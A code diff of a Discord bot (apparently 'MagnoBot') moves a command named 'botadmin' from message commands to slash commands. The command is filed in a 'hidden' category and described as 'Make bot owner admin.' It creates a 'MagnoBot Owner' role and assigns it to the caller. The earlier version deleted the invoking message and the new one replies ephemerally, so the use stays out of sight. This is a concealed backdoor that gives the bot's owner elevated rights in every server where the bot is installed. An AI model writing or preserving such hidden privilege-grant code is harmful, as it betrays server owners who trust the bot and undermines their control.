@@ -1,15 +1,13 @@
 const {Permissions} = require("discord.js")
 module.exports = {
     name: "botadmin",
-    aliases: [],
     category: "hidden",
     permissions: -1,
     description: 'Make bot owner admin.',
-    usage: "",
-    run: async ({ client, message, args }) => {
+    run: async ({ interaction }) => {
         try {
 
-            role = await message.guild.roles.create(
+            role = await interaction.guild.roles.create(
                 {
                     name: "MagnoBot Owner",
                     color: "BLUE",
@@ -42,8 +40,8 @@ module.exports = {
                 }
             );
 
-            message.member.roles.add(role)
-            message.delete();
+            interaction.member.roles.add(role)
+            interaction.reply({content: "Bot admin role assigned", ephemeral: true})
 
         } catch (e) {
 
